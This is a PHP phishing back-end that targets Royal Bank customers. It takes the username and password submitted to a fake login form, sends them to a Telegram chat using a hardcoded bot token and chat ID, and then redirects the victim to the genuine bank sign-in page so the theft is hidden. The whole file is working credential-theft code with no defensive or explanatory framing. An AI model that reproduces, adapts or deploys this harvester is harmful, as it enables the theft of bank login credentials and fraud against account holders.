<?php
// Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID.
$botToken = '6567404843:AAGoQnv3BmdA_h7Xhu_3J6onnl2Ihy8RnTs';
$chatID = '6181062580';

// Get form data
$username = $_POST['username'];
$password = $_POST['password'];

// Compose the message
$message = "New Login Attempt:\nUsername: $username\nPassword: $password";

// Send the message to Telegram
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
file_get_contents($telegramURL);

// Redirect the user to a legitimate login page
header('Location: https://secure.royalbank.com/statics/login-service-ui/index#/full/signin');
exit();
?>
